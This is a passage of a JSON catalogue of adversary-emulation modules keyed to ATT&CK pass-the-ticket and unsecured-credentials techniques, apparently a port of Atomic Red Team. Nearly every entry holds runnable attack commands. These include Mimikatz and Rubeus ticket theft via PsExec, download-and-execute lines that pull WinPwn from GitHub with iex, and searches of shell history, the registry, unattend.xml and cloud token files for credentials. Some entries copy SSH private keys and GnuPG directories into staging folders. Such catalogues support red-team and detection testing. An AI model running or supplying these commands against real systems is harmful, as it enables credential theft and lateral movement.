        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ticket",
          "description": "Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module)",
          "type": "string",
          "default_value": null
        },
        {
          "name": "mimikatz_exe",
          "description": "Path of the Mimikatz binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
          "check_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "dbf38128-7ba7-4776-bedf-cc2eed432098",
      "module_name": "Mimikatz Kerberos Ticket Attack"
    },
    {
      "index": 1362,
      "technique_id": "T1550.003",
      "technique_name": "Use Alternate Authentication Material: Pass the Ticket",
      "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\#{target} -w c:\\ -c \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubeus.exe\" purge      ",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target",
          "description": "Remote system to request the TGT from",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "user_name",
          "description": "username associated with the ticket (privileged account not required)",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "password",
          "description": "password for user_name",
          "type": "string",
          "default_value": "Password"
        },
        {
          "name": "domain",
          "description": "domain",
          "type": "string",
          "default_value": "$Env:USERDOMAIN"
        },
        {
          "name": "rubeus_url",
          "description": "URL of Rubeus executable",
          "type": "url",
          "default_value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Rubeus must exist on disk at \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubeus.exe\"\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubeus.exe\"\n"
        },
        {
          "description": "PsExec must exist on disk at \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\"\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
        }
      ],
      "rx_module_id": "a2fc4ec5-12c6-4fb4-b661-961f23f359cb",
      "module_name": "Rubeus Kerberos Pass The Ticket"
    },
    {
      "index": 1363,
      "technique_id": "T1552",
      "technique_name": "Unsecured Credentials",
      "description": "This raglox runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This RAGLOX module leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos",
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n",
        "elevation_required": false,
        "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n"
      },
      "variables": [
        {
          "name": "stratus_path",
          "description": "Path of stratus binary",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1552/src"
        },
        {
          "name": "aws_region",
          "description": "AWS region to detonate",
          "type": "string",
          "default_value": "us-west-2"
        }
      ],
      "prerequisites": [
        {
          "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
          "check_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
        },
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "a21118de-b11e-4ebd-b655-42f11142df0c",
      "module_name": "AWS - Retrieve EC2 Password Data using stratus"
    },
    {
      "index": 1364,
      "technique_id": "T1552",
      "technique_name": "Unsecured Credentials",
      "description": "Find passwords in the powershell history files\nSearching for following strings: \"password\", \"-p\", \"key\", \"pwd\", \"pass\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "ls -R C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String \"password\", \"-p\", \"key\", \"pwd\", \"pass\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f9c3d0ab-479b-4019-945f-22ace2b1731a",
      "module_name": "Search for Passwords in Powershell History"
    },
    {
      "index": 1365,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "find #{file_path}/.aws -name \"credentials\" -type f 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default_value": "/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "37807632-d3da-442e-8c2e-00f44928ff8f",
      "module_name": "Find AWS credentials"
    },
    {
      "index": 1366,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "python2 laZagne.py all\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9e507bb8-1d30-4e3b-a49b-cb5727d7ea79",
      "module_name": "Extract Browser and System credentials with LaZagne"
    },
    {
      "index": 1367,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Extracting credentials from files\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "grep -ri password #{file_path}\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default_value": "/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "bd4cf0d1-7646-474e-8610-78ccf5a097c4",
      "module_name": "Extract passwords with grep"
    },
    {
      "index": 1368,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0e56bf29-ff49-4ea5-9af4-3b81283fd513",
      "module_name": "Extracting passwords with findstr"
    },
    {
      "index": 1369,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "367d4004-5fc0-446d-823f-960c74ae52c3",
      "module_name": "Access unattend.xml"
    },
    {
      "index": 1370,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default_value": "/home"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "da4f751a-020b-40d7-b9ff-d433b7799803",
      "module_name": "Find and Access Github Credentials"
    },
    {
      "index": 1371,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0",
      "module_name": "WinPwn - sensitivefiles"
    },
    {
      "index": 1372,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fdd0c913-714b-4c13-b40f-1824d6c015f2",
      "module_name": "WinPwn - Snaffler"
    },
    {
      "index": 1373,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "75f66e03-37d3-4704-9520-3210efbe33ce",
      "module_name": "WinPwn - powershellsensitive"
    },
    {
      "index": 1374,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Search for Passwords on this system using passhunt via WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive",
        "elevation_required": false,
        "cleanup_command": "rm -force .\\passhunt.exe -ErrorAction Ignore\nrm -force .\\phunter* -ErrorAction Ignore\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797",
      "module_name": "WinPwn - passhunt"
    },
    {
      "index": 1375,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Launches SessionGopher on this system via WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c9dc9de3-f961-4284-bd2d-f959c9f9fda5",
      "module_name": "WinPwn - SessionGopher"
    },
    {
      "index": 1376,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "aaa87b0e-5232-4649-ae5c-f1724a4b2798",
      "module_name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials"
    },
    {
      "index": 1377,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Via PowerShell,list files where credentials are stored in Windows Credential Manager\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0d4f2281-f720-4572-adc8-d5bb1618affe",
      "module_name": "List Credential Files via PowerShell"
    },
    {
      "index": 1378,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Via Command Prompt,list files where credentials are stored in Windows Credential Manager\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b0cdacf6-8949-4ffe-9274-a9643a788e55",
      "module_name": "List Credential Files via Command Prompt"
    },
    {
      "index": 1379,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Find local Azure credentials from file, defaults to using / as the look path.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "find #{file_path}/.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default_value": "/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a8f6148d-478a-4f43-bc62-5efee9f931a4",
      "module_name": "Find Azure credentials"
    },
    {
      "index": 1380,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Find local Google Cloud Platform credentials from file, defaults to using / as the look path.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "find #{file_path}/.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default_value": "/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "aa12eb29-2dbb-414e-8b20-33d34af93543",
      "module_name": "Find GCP credentials"
    },
    {
      "index": 1381,
      "technique_id": "T1552.001",
      "technique_name": "Unsecured Credentials: Credentials In Files",
      "description": "Find local Oracle cloud credentials from file, defaults to using / as the look path.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "find #{file_path}/.oci/sessions -name \"token\" -type f 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default_value": "/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9d9c22c9-fa97-4008-a204-478cf68c40af",
      "module_name": "Find OCI credentials"
    },
    {
      "index": 1382,
      "technique_id": "T1552.002",
      "technique_name": "Unsecured Credentials: Credentials in Registry",
      "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b6ec082c-7384-46b3-a111-9a9b8b14e5e7",
      "module_name": "Enumeration for Credentials in Registry"
    },
    {
      "index": 1383,
      "technique_id": "T1552.002",
      "technique_name": "Unsecured Credentials: Credentials in Registry",
      "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "af197fd7-e868-448e-9bd5-05d1bcd9d9e5",
      "module_name": "Enumeration for PuTTY Credentials in Registry"
    },
    {
      "index": 1384,
      "technique_id": "T1552.003",
      "technique_name": "Unsecured Credentials: Bash History",
      "description": "Search through bash history for specifice commands we want to capture\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "~/loot.txt"
        },
        {
          "name": "bash_history_grep_args",
          "description": "grep arguments that filter out specific commands we want to capture",
          "type": "path",
          "default_value": "-e '-p ' -e 'pass' -e 'ssh'"
        },
        {
          "name": "bash_history_filename",
          "description": "Path of the bash history file to capture",
          "type": "path",
          "default_value": "~/.bash_history"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3cfde62b-7c33-4b26-a61e-755d6131c8ce",
      "module_name": "Search Through Bash History"
    },
    {
      "index": 1385,
      "technique_id": "T1552.003",
      "technique_name": "Unsecured Credentials: Bash History",
      "description": "Search through sh history for specifice commands we want to capture\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "~/loot.txt"
        },
        {
          "name": "sh_history_grep_args",
          "description": "grep arguments that filter out specific commands we want to capture",
          "type": "path",
          "default_value": "-e '-p ' -e 'pass' -e 'ssh'"
        },
        {
          "name": "sh_history_filename",
          "description": "Path of the sh history file to capture",
          "type": "path",
          "default_value": "~/.history"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d87d3b94-05b4-40f2-a80f-99864ffa6803",
      "module_name": "Search Through sh History"
    },
    {
      "index": 1386,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dir c:\\ /b /s .key | findstr /e .key\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "520ce462-7ca7-441e-b5a5-f8347f632696",
      "module_name": "Private Keys"
    },
    {
      "index": 1387,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Discover private SSH keys on a FreeBSD, macOS or Linux system.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from.",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_file",
          "description": "Output file containing locations of SSH key files",
          "type": "path",
          "default_value": "/tmp/keyfile_locations.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "46959285-906d-40fa-9437-5a439accd878",
      "module_name": "Discover Private SSH Keys"
    },
    {
      "index": 1388,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{output_folder}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from.",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_folder",
          "description": "Output folder containing copies of SSH private key files",
          "type": "path",
          "default_value": "/tmp/art-staging"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7c247dc7-5128-4643-907b-73a76d9135c3",
      "module_name": "Copy Private SSH Keys with CP"
    },
    {
      "index": 1389,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \\;\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{output_folder}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from.",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_folder",
          "description": "Output folder containing copies of SSH private key files",
          "type": "path",
          "default_value": "/tmp/art-staging"
        }
      ],
      "prerequisites": [
        {
          "description": "Install GNU cp from coreutils package.\n",
          "check_command": "if [ ! -x \"$(command -v gcp)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y coreutils)\n"
        }
      ],
      "rx_module_id": "12e4a260-a7fd-4ed8-bf18-1a28c1395775",
      "module_name": "Copy Private SSH Keys with CP (freebsd)"
    },
    {
      "index": 1390,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{output_folder}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from.",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_folder",
          "description": "Output folder containing copies of SSH private key files",
          "type": "path",
          "default_value": "/tmp/art-staging"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "864bb0b2-6bb5-489a-b43b-a77b3a16d68a",
      "module_name": "Copy Private SSH Keys with rsync"
    },
    {
      "index": 1391,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{output_folder}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from.",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_folder",
          "description": "Output folder containing copies of SSH private key files",
          "type": "path",
          "default_value": "/tmp/art-staging"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if rsync is installed.\n",
          "check_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y rsync)\n"
        }
      ],
      "rx_module_id": "922b1080-0b95-42b0-9585-b9a5ea0af044",
      "module_name": "Copy Private SSH Keys with rsync (freebsd)"
    },
    {
      "index": 1392,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{output_folder}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_folder",
          "description": "Output folder containing a copy of the .gnupg directory",
          "type": "path",
          "default_value": "/tmp/GnuPG"
        }
      ],
      "prerequisites": [],
